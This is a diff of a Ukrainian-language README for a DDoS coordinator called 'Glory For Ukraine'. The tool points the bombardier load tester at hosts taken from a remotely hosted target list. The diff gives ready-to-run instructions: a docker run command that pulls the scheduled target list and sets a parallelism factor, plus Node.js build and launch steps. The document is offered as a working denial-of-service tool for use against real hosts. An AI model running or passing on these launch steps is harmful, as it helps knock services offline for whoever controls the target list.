@@ -1,16 +1,17 @@
 # Glory For Ukraine
 
-DDOS координатор, використовуючий bombardier на один з хостів указаний в targets.json, скачаний з https://gloryforukraine.pages.dev/targets.json
+DDOS координатор, використовуючий bombardier на один з хостів указаний в scheduled_targets.json, скачаний з https://gloryforukraine.pages.dev/scheduled_targets.json
 
 ## Як використати
 
-Запуск через докер: `docker run --rm -it archdev/gloryforukraine`
+Запуск через докер: `docker run --env SCHEDULED_TARGETS_URL=https://gloryforukraine.pages.dev/scheduled_targets.json PARALLEL_FACTOR=5 --rm -it archdev/gloryforukraine`
 
 Запуск через білд: 
-- install go
+- install NodeJS 16+
 - git clone
 - cd gloryforukraine
-- `./scripts/launchers/launch.sh` or `.\scripts\launchers\launch.bat`
+- npm i
+- `./scripts/launch.sh` or `.\scripts\launch.bat`
 
 # Як засетапи Gloryforukraine на Digigal Ocean App Platform
 
